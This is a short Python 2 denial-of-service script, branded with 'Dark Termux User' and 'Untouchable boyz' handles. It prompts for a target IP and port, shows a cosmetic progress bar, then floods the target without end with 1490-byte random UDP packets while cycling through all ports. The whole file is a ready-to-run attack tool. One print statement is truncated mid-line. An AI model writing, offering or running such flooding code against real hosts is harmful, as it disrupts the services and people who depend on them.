#!/usr/bin/python2
#coder:AloneLoverTz
#darkTermuxUser
#Untouchable boyz

import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")

#Dev:untouchable boyz
##### L0G0 #####
print("""
\033[1;91m
8888888b.                           d8888
888  "Y88b                         d88888
888    888                        d88P888
888    888  .d88b.  .d8888b      d88P 888
888    888 d88""88b 88K         d88P  888
888    888 888  888 "Y8888b.   d88P   888
888  .d88P Y88..88P      X88  d8888888888
8888888P"   "Y88P"   88888P' d88P     888
\033[31m You Tube : Dark Termux User
\033[37m github   : 4loverloVerTz
\033[35m Instagram: Dark Termux User
     \033[31m !UNTOUCHABLE BOYZ!
     """)
print
ip = raw_input("IP Target [!]  : ")
port = input("Port [!]  : ")

os.system("clear")
os.system("figlet Prepare Attack...")
print "[ Please Wait ......]"
time.sleep(5)
print "[++++++             ] 30%"
time.sleep(5)
print "[+++++++++          ] 50%"
time.sleep(5)
print "[++++++++++++++     ] 85%"
time.sleep(5)
print "[+++++++++++++++++++] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,>
     if port == 65534:
       port = 1
